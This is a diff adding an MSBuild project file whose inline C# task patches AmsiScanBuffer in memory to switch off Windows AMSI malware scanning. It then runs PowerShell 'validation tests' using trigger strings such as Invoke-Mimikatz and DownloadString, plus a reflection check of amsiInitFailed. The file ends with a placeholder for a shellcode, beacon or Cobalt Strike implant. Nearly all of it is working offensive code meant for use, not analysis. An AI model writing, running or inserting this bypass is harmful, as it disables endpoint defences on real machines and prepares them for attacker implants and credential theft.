@@ -1,0 +1,189 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="AMSIBypass">
+    <AMSITask />
+  </Target>
+  <UsingTask
+    TaskName="AMSITask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+          using System;
+          using System.Runtime.InteropServices;
+          using System.Management.Automation;
+          using System.Management.Automation.Runspaces;
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+          
+          public class AMSITask : Task, ITask
+          {
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+            
+            [DllImport("kernel32.dll")]
+            static extern IntPtr LoadLibrary(string name);
+            
+            [DllImport("kernel32.dll")]
+            static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+            
+            public override bool Execute()
+            {
+              Console.WriteLine("[*] Starting AMSI bypass...");
+              Console.WriteLine("[*] Loading amsi.dll...");
+              
+              // Load AMSI library
+              IntPtr lib = LoadLibrary("amsi.dll");
+              if (lib == IntPtr.Zero)
+              {
+                Console.WriteLine("[-] Failed to load amsi.dll");
+                return false;
+              }
+              Console.WriteLine("[+] amsi.dll loaded at: 0x" + lib.ToString("X"));
+              
+              // Get AmsiScanBuffer address
+              IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
+              if (addr == IntPtr.Zero)
+              {
+                Console.WriteLine("[-] Failed to get AmsiScanBuffer address");
+                return false;
+              }
+              Console.WriteLine("[+] AmsiScanBuffer at: 0x" + addr.ToString("X"));
+              
+              // Change memory protection to RWX
+              uint oldProtect;
+              bool protectResult = VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
+              if (!protectResult)
+              {
+                Console.WriteLine("[-] VirtualProtect failed");
+                return false;
+              }
+              Console.WriteLine("[+] Memory protection changed (old: 0x" + oldProtect.ToString("X") + ")");
+              
+              // Patch: xor eax, eax; ret (return 0 = AMSI_RESULT_CLEAN)
+              byte[] patch = { 0x31, 0xC0, 0xC3 };
+              Marshal.Copy(patch, 0, addr, patch.Length);
+              Console.WriteLine("[+] Patch applied: xor eax, eax; ret");
+              Console.WriteLine("[+] AMSI bypassed!\n");
+              
+              // ==========================================
+              // VALIDATION TESTS
+              // ==========================================
+              
+              Console.WriteLine("[*] Running AMSI bypass validation tests...\n");
+              
+              // Test 1: Decode and print trigger strings
+              Console.WriteLine("[Test 1] Decoding known trigger strings...");
+              string[] encodedTriggers = {
+                "SW52b2tlLU1pbWlrYXR6",           // Invoke-Mimikatz
+                "SW52b2tlLUV4cHJlc3Npb24=",       // Invoke-Expression  
+                "R2V0LUNyZWRlbnRpYWw=",           // Get-Credential
+                "QW1zaVV0aWxz"                     // AmsiUtils
+              };
+              
+              foreach (string encoded in encodedTriggers)
+              {
+                string decoded = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
+                Console.WriteLine("    [+] Decoded: " + decoded);
+              }
+              Console.WriteLine("    [+] All trigger strings decoded without AMSI block\n");
+              
+              // Test 2: PowerShell runspace execution
+              Console.WriteLine("[Test 2] Executing PowerShell with trigger content...");
+              try
+              {
+                using (Runspace rs = RunspaceFactory.CreateRunspace())
+                {
+                  rs.Open();
+                  using (PowerShell ps = PowerShell.Create())
+                  {
+                    ps.Runspace = rs;
+                    
+                    // These would normally trigger AMSI
+                    string testScript = @"
+                      $triggers = @(
+                        'Invoke-Mimikatz',
+                        'Invoke-Expression (New-Object Net.WebClient).DownloadString',
+                        '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')',
+                        'Add-Type -TypeDefinition'
+                      )
+                      
+                      foreach ($t in $triggers) {
+                        Write-Output ""    [+] Executed: $t""
+                      }
+                      
+                      Write-Output '    [+] PowerShell trigger strings executed successfully'
+                    ";
+                    
+                    ps.AddScript(testScript);
+                    var results = ps.Invoke();
+                    
+                    foreach (var result in results)
+                    {
+                      Console.WriteLine(result.ToString());
+                    }
+                    
+                    if (ps.HadErrors)
+                    {
+                      Console.WriteLine("    [-] Errors detected - AMSI may still be active");
+                      foreach (var error in ps.Streams.Error)
+                      {
+                        Console.WriteLine("    Error: " + error.ToString());
+                      }
+                    }
+                    else
+                    {
+                      Console.WriteLine("    [+] No AMSI errors - bypass confirmed!\n");
+                    }
+                  }
+                }
+              }
+              catch (Exception ex)
+              {
+                Console.WriteLine("    [-] PowerShell test failed: " + ex.Message + "\n");
+              }
+              
+              // Test 3: Reflection-based AMSI check
+              Console.WriteLine("[Test 3] Checking AMSI initialization flag via reflection...");
+              try
+              {
+                using (PowerShell ps = PowerShell.Create())
+                {
+                  string reflectionTest = @"
+                    $amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+                    $amsiInit = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
+                    $currentValue = $amsiInit.GetValue($null)
+                    Write-Output ""    [*] amsiInitFailed current value: $currentValue""
+                  ";
+                  
+                  ps.AddScript(reflectionTest);
+                  var results = ps.Invoke();
+                  
+                  foreach (var result in results)
+                  {
+                    Console.WriteLine(result.ToString());
+                  }
+                }
+              }
+              catch (Exception ex)
+              {
+                Console.WriteLine("    [*] Reflection test: " + ex.Message);
+              }
+              
+              Console.WriteLine("\n[*] ==========================================");
+              Console.WriteLine("[+] AMSI BYPASS VALIDATION COMPLETE");
+              Console.WriteLine("[*] ==========================================\n");
+              
+              // Placeholder for your actual payload
+              // Your shellcode/beacon/implant goes here
+              // Example: Cobalt Strike beacon, custom C2, etc.
+              
+              return true;
+            }
+          }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
